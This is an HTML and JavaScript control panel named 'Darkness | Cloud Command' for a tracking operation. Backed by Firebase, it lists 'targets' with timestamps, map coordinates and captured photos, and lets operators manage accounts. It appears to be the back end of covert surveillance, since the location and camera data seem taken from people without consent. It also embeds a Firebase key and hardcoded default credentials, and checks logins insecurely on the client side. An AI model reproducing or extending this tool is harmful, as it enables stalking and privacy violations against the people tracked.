<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Darkness | Cloud Command</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        :root { --red: #ff0000; --bg: #000; --card: #080808; }
        body { background: var(--bg); color: #fff; font-family: sans-serif; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
        .banner { background: var(--red); color: #fff; font-size: 11px; font-weight: 900; text-align: center; padding: 12px; letter-spacing: 3px; }
        .header { padding: 20px; text-align: center; border-bottom: 1px solid #111; }
        .header h1 { color: var(--red); margin: 0; font-size: 26px; letter-spacing: 5px; }
        .container { flex: 1; padding: 20px; overflow-y: auto; }
        .section { display: none; }
        .section.active { display: block; }
        .bottom-nav { background: #050505; height: 80px; display: flex; border-top: 1px solid #111; }
        .nav-btn { flex: 1; background: none; border: none; color: #444; font-size: 11px; font-weight: bold; cursor: pointer; display: flex; flex-direction: column; align-items: center; justify-content: center; }
        .nav-btn.active { color: #fff; border-top: 3px solid var(--red); }
        .nav-btn span { font-size: 24px; margin-bottom: 5px; }
        table { width: 100%; border-collapse: collapse; font-size: 13px; }
        th { color: var(--red); text-align: left; padding: 10px 5px; border-bottom: 1px solid #222; }
        td { padding: 15px 5px; border-bottom: 1px solid #111; }
        .btn-act { background: none; border: 1px solid var(--red); color: var(--red); padding: 8px 12px; font-size: 10px; cursor: pointer; font-weight: bold; }
        input, select { width: 100%; padding: 12px; margin: 8px 0; background: #111; border: 1px solid #222; color: #fff; }
        #login-screen { position: fixed; inset: 0; background: #000; z-index: 999; display: flex; align-items: center; justify-content: center; padding: 40px; }
    </style>
</head>
<body>
    <div id="login-screen">
        <div style="width:100%; max-width:300px; text-align:center;">
            <h1 style="color:var(--red); letter-spacing:10px;">DARKNESS</h1>
            <input type="text" id="uIn" placeholder="USER ID"><input type="password" id="pIn" placeholder="PASS KEY">
            <button style="background:var(--red); color:#fff; border:none; padding:15px; width:100%; font-weight:bold; margin-top:10px;" onclick="login()">AUTHORIZE</button>
        </div>
    </div>

    <div class="banner">DEVELOPER KALZ | RMT CLOUD SYSTEM</div>
    <div class="header"><h1>DARKNESS</h1><div id="uInf" style="font-size:10px; color:#444; margin-top:5px;"></div></div>

    <div class="container">
        <div id="t-track" class="section active">
            <table><thead><tr><th>WAKTU</th><th>MAPS</th><th>FOTO</th><th>X</th></tr></thead>
            <tbody id="l-track"></tbody></table>
        </div>
        <div id="t-acc" class="section">
            <div style="background:var(--card); padding:15px; margin-bottom:20px;">
                <input type="text" id="nu" placeholder="USER"><input type="password" id="np" placeholder="PASS">
                <select id="nr"><option value="member">MEMBER</option><option value="admin">ADMIN</option><option value="owner">OWNER</option></select>
                <button class="btn-act" style="width:100%; margin-top:10px;" onclick="createAcc()">CREATE OPERATIVE</button>
            </div>
            <table><thead><tr><th>USER</th><th>ROLE</th><th>ACT</th></tr></thead><tbody id="l-user"></tbody></table>
        </div>
        <div id="t-supp" class="section">
            <div style="border-left: 3px solid var(--red); padding:15px; background:var(--card);">
                <p>LEAD: KALZ</p><p>DATABASE: CLOUD CONNECTED</p>
            </div>
            <button class="btn-act" style="width:100%; margin-top:30px; padding:15px;" onclick="location.reload()">OFFLINE MODE</button>
        </div>
    </div>

    <div class="bottom-nav">
        <button class="nav-btn active" onclick="tab('t-track', this)"><span>🛰️</span>TRACK</button>
        <button id="n-acc" class="nav-btn" onclick="tab('t-acc', this)"><span>👥</span>ACC</button>
        <button class="nav-btn" onclick="tab('t-supp', this)"><span>🛠️</span>SUPP</button>
    </div>

<script>
    // Konfigurasi Firebase Lu
    const firebaseConfig = {
        apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ",
        databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    let ses = null;

    function login() {
        const u = document.getElementById('uIn').value, p = document.getElementById('pIn').value;
        db.ref('users').once('value', s => {
            const data = s.val() || { "Kalz": {p:"111", r:"developer"} };
            if(data[u] && data[u].p === p) {
                ses = {u, r: data[u].r};
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('uInf').innerText = `ACCESS: ${u.toUpperCase()} | ROLE: ${ses.r.toUpperCase()}`;
                if(ses.r !== 'developer') document.getElementById('n-acc').style.display = 'none';
                syncData();
            } else alert("DENIED");
        });
    }

    function syncData() {
        // Sinkron Akun
        db.ref('users').on('value', s => {
            const b = document.getElementById('l-user'); b.innerHTML = '';
            const data = s.val();
            if(!data[ses.u]) location.reload(); // Force Logout
            for(let u in data) {
                if(data[u].r === 'developer') continue;
                b.innerHTML += `<tr><td>${u}</td><td>${data[u].r}</td><td><button class="btn-act" onclick="delU('${u}')">X</button></td></tr>`;
            }
        });
        // Sinkron Target
        db.ref('targets').on('value', s => {
            const b = document.getElementById('l-track'); b.innerHTML = '';
            const data = s.val();
            for(let id in data) {
                const x = data[id];
                const m = `https://www.google.com/maps?q=${x.lat},${x.lon}`;
                b.innerHTML += `<tr><td>${x.time}</td><td><button class="btn-act" onclick="window.open('${m}')">📍 MAPS</button></td><td><button class="btn-act" onclick="reqF('${x.img}')">📸 FOTO</button></td><td><button class="btn-act" onclick="delT('${id}')">X</button></td></tr>`;
            }
        });
    }

    function tab(id, b) {
        document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
        document.querySelectorAll('.nav-btn').forEach(n => n.classList.remove('active'));
        document.getElementById(id).classList.add('active'); b.classList.add('active');
    }

    function createAcc() {
        const u = document.getElementById('nu').value, p = document.getElementById('np').value, r = document.getElementById('nr').value;
        if(u && p) db.ref('users/' + u).set({p, r});
    }

    function delU(u) { if(confirm("FORCE LOGOUT?")) db.ref('users/' + u).remove(); }
    function delT(id) { db.ref('targets/' + id).remove(); }
    function reqF(img) {
        const w = window.open("");
        w.document.write(`<body style="background:#000;display:flex;align-items:center;justify-content:center;margin:0"><img src="${img}" style="max-width:100%;border:2px solid red;"></body>`);
    }
</script>
</body>
</html>
